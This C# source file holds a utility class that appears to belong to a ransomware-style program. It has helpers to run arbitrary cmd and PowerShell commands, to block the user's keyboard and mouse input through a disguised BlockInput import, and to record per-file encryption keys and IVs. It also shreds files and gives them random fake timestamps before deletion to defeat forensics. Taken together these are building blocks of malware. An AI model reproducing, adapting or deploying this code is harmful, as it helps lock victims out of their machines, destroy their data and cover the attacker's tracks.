using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Xml.Serialization;

namespace Shared
{
    public class Utils
    {
        public const string CMD_PATH = @"C:\Windows\System32\cmd.exe";

        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]

        private static extern bool InputManager([MarshalAs(UnmanagedType.Bool)] bool block);

        public static string KeyToString(RSAParameters key)
        {
            StringWriter sw = new StringWriter();
            XmlSerializer xs = new XmlSerializer(typeof(RSAParameters));

            xs.Serialize(sw, key);
            return sw.ToString();
        }

        public static RSAParameters StringToKey(string key)
        {
            StringReader sr = new StringReader(key);
            XmlSerializer xs = new XmlSerializer(typeof(RSAParameters));

            return (RSAParameters)xs.Deserialize(sr);
        }

        public static string? RunCMDCommand(string command)
        {
            try
            {
                Process process = new Process();

                process.StartInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    FileName = CMD_PATH,
                    Arguments = $"/c {command}"
                };

                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return null;
            }
        }

        public async static Task<List<string>?> RunPowershellCommand(string script, Dictionary<string, object>? parameters = null, string? member = null)
        {
            if (string.IsNullOrEmpty(script))
                return null;

            try
            {
                List<string> output = new List<string>();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.AddScript(script);

                    if (parameters != null)
                        ps.AddParameters(parameters);

                    ICollection<PSObject> result = await ps.InvokeAsync().ConfigureAwait(false);
                    foreach (PSObject item in result)
                    {
                        if (member != null)
                        {
                            PSMemberInfo? possibleOutput = item.Members[member];
                            if (possibleOutput != null)
                            {
                                string? val = possibleOutput.Value.ToString();
                                if (val != null)
                                    output.Add(val);
                            }
                        }
                        else
                        {
                            string? data = item.ToString();
                            if (data != null)
                                output.Add(data);
                        }
                    }
                }

                return output;
            }
            catch (Exception) { return null; }
        }

        public static string GetRandomPath(string dir, string? extension = null)
        {
            string guid;
            do
            {
                guid = Guid.NewGuid().ToString();
            } while (File.Exists(Path.Combine(dir, guid)));

            if (string.IsNullOrEmpty(extension) || string.IsNullOrEmpty(extension))
                return Path.Combine(dir, guid);

            return Path.Combine(dir, guid + extension);
        }

        public static void BlockInput(bool shouldBlock)
        {
            InputManager(shouldBlock);
        }

        public static void WriteDictToFile(string filePath, List<string> keys, List<string> ivs, string[] paths)
        {
            if (string.IsNullOrEmpty(filePath) || keys == null || ivs == null || paths == null)
                return;

            using StreamWriter? sw = new StreamWriter(filePath);
            int min = Math.Min(keys.Count, Math.Min(ivs.Count, paths.Length));

            for (int i = 0; i < min; i++)
            {
                sw.WriteLine($"{keys[i]} {ivs[i]}\t{paths[i]}");
            }
        }

        public static void ShredFile(string? path, int timesToOverwrite = 5)
        {
            try
            {
                if (!string.IsNullOrEmpty(path) && !string.IsNullOrWhiteSpace(path) && File.Exists(path))
                {
                    File.SetAttributes(path, FileAttributes.Normal);
                    double sectors = Math.Ceiling(new FileInfo(path).Length / 512.0);
                    byte[] randomBuffer = new byte[512];

                    FileStream? inputStream = new FileStream(path, FileMode.Open);
                    if (inputStream == null)
                        return;

                    for (int currentPass = 0; currentPass < timesToOverwrite; currentPass++)
                    {
                        inputStream.Position = 0;
                        for (int sectorWritten = 0; sectorWritten < sectors; sectorWritten++)
                        {
                            RandomNumberGenerator.Fill(randomBuffer);
                            inputStream.Write(randomBuffer, 0, randomBuffer.Length);
                        }
                    }

                    inputStream.SetLength(0);
                    inputStream.Close();

                    Random rand = new Random();
                    DateTime dt = new DateTime(rand.Next(2007, 2023), rand.Next(1, 12), rand.Next(1, 28), rand.Next(1, 12), rand.Next(1, 60), rand.Next(1, 60));

                    File.SetCreationTime(path, dt);
                    File.SetLastAccessTime(path, dt);
                    File.SetLastWriteTime(path, dt);
                    File.SetCreationTimeUtc(path, dt);
                    File.SetLastAccessTimeUtc(path, dt);
                    File.SetLastWriteTimeUtc(path, dt);

                    File.Delete(path);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static bool DoesRegExists(int hive, string path, string name)
        {
            RegistryKey? reg = GetRegistry(hive, path);
            if (reg == null)
                return false;

            object? regValue = reg.GetValue(name);
            if (regValue == null)
                return false;

            return true;
        }

        public static bool DoesRegExists(int hive, string path, string name, object value)
        {
            RegistryKey? reg = GetRegistry(hive, path);
            if (reg == null)
                return false;

            object? regValue = reg.GetValue(name);
            if (regValue == null)
                return false;

            return regValue == value;
        }

        public static void CreateRegister(int hive, string path, string name)
        {
            CreateRegister(hive, path, name, null);
        }

        public static void CreateRegister(int hive, string path, string name, object? value)
        {
            try
            {
                ModifyRegister(hive, path, name, value);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void ModifyRegister(int hive, string path, string name, object? value)
        {
            try
            {
                RegistryKey? key = GetRegistry(hive, path);
                if (key == null)
                    return;

                if (value == null)
                    key.SetValue(name, string.Empty);
                else
                    key.SetValue(name, value);

                key.Close();
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void DeleteRegistry(int hive, string path, string name)
        {
            try
            {
                RegistryKey? key = GetRegistry(hive, path);
                if (key == null)
                    return;

                key.DeleteValue(name);
                key.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private static RegistryKey? GetRegistry(int hive, string path)
        {
            if (hive == 0)
                return Registry.CurrentUser.OpenSubKey(path, true);
            else if (hive == 1)
                return Registry.LocalMachine.OpenSubKey(path, true);
            else
                return null;
        }
    }
}
